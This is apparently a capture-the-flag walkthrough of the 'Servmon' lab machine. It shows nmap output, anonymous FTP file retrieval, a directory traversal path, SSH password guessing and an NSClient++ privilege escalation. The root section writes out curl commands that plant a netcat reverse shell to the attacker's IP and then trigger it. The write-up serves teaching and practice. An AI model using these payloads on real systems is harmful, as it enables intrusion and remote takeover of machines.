# Servmon walkthrough

Machine ip: 10.10.10.184

Namp output:

```
# Nmap 7.80 scan initiated Sun Apr 19 05:36:55 2020 as: nmap -o namp_def.txt -sS -sV -sC -p 0-10000 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.042s latency).
Not shown: 9653 closed ports, 336 filtered ports
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp   open  http
| fingerprint-strings:
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5040/tcp open  unknown
5666/tcp open  tcpwrapped
6063/tcp open  x11?
6699/tcp open  tcpwrapped
7680/tcp open  pando-pub?
8443/tcp open  ssl/https-alt
| fingerprint-strings:
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions:
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest:
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     guage
|     n-US,e":{"context":"ini://${shared-path}/nsclient.ini","has_changed":false,"type":"ini"}}]}
|_    eduler/schedules/foobar, is_tpl: false, parent: default, value: command = foobar, options : { } }, command: command,
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
|_ssl-date: TLS randomness does not represent time
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.80%I=7%D=4/19%Time=5E9C2082%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.80%T=SSL%I=7%D=4/19%Time=5E9C208A%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,122,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocatio
SF:n:\x20/index\.html\r\n\r\nguage\0\0\0\0\0\0\0\0\0\x0f\0\0\0\0\0\0\0\0n-
SF:US,e\":{\"context\":\"ini://\${shared-path}/nsclient\.ini\",\"has_chang
SF:ed\":false,\"type\":\"ini\"}}\]}\0\0eduler/schedules/foobar,\x20is_tpl:
SF:\x20false,\x20parent:\x20default,\x20value:\x20command\x20=\x20foobar,\
SF:x20options\x20:\x20{\x20}\x20},\x20command:\x20command,")%r(HTTPOptions
SF:,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x
SF:20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:\x
SF:2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x204
SF:04\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIPOpti
SF:ons,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20no
SF:t\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode:
|   3.00:
|_    Message signing enabled but not required
|_smb2-time: Protocol negotiation failed (SMB2)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Apr 19 06:01:29 2020 -- 1 IP address (1 host up) scanned in 1474.21 seconds

 ```

## User

FTP service allow us to connect anonymously and get two files.

The first file, Confidential.txt, contains the following message:
 ```
Nathan,
I left your Passwords.txt file on your Desktop. Please remove this once
you have edited it yourself and place it back into the secure folder.
Regards
Nadine
```

The second, Notes_to_do.txt, contains reminders on the aspects of the system to be updated:
```
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
```

The nvms service is voulnerable to a directory trasverlas attack according to exploitDB (https://www.exploit-db.com/exploits/47774)
With Burp we can intercept the request and change the get to reach the following path: ```/../../../../../../../../../../.
./../windows/win.ini```
Then we can get the file on Nathan desktop and get the passwords. Hydra helps me out with the password and discover that one of them allows us to
connect with ssh to nadine account. User is done.

## Root

After a quick search on google about the other service running on the machine we can find that nscpclinet is vulnerable.
Inside the folder of installed programs, we can read the configuration file of the service, containing the
password for clear access. Still on ExploitDB, you can find the exploit for the service:
https://www.exploit-db.com/exploits/46802.

In order to get a shell I've uploaded nc.exe and make a curl request to the vulnerable endpoint of the api to run nc and get a shell.
The full command is: ```curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/mio.bat --data-binary "C:\Temp\ncmio.exe 10.10.14.249 4444 -e cmd.exe"```

Listening with netcat i can get a rev shell and execute my script locally: ```curl -s -k -u admin https://127.0.0.1:8443/api/v1/queries/mio```

Root is done.
